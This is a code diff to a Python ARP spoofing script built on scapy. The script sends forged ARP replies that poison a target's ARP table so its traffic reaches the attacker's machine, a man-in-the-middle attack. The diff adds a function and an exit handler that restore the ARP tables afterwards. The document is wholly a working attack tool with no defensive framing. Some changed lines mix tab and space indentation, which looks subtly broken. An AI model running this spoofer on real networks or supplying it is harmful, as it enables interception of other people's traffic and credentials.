@@ -17,13 +17,18 @@ def get_mac(ip):
 
 def spoof(client_ip, spoof_ip):
     client_mac = get_mac(client_ip)
-
     if client_mac == None:
-        print("\rARP Spoofer: Host not active!", end='', flush=True)
-        return None
-    
+    	print("\rARP Spoofer: Host not active!", end='', flush=True)
+    	return None
     arp_request = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=spoof_ip)  # Don't use the router 'hwsrc' so the client use our mac address and update it on it's arp table.
     scapy.send(arp_request, verbose=False)
+    
+
+def restore_spoof(dst_ip, src_ip):
+	dst_mac = get_mac(dst_ip)
+	src_mac = get_mac(src_ip)
+	arp_response = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
+	scapy.send(arp_response, count=6, verbose=False)
 
 
 if __name__ == "__main__":
@@ -33,7 +38,6 @@ if __name__ == "__main__":
 	
 
 	elif args[1] == "-spoof":
-	
 		try:
 			spoof_packet = 0
 			while True:
@@ -44,5 +48,13 @@ if __name__ == "__main__":
 
 				print(f"\rARP Spoofer: Sent {spoof_packet} spoof packets!", end='', flush=True)
 				time.sleep(2)
+				
+		except KeyboardInterrupt:
+			restore_spoof(args[2], args[3])
+			restore_spoof(args[3], args[2])
+			print(f"ARP Spoofer: Quiting....\n")
+		
 		except Exception as e:
 			print(f"ARP Spoofer quit due to: {e}")
+				
+	
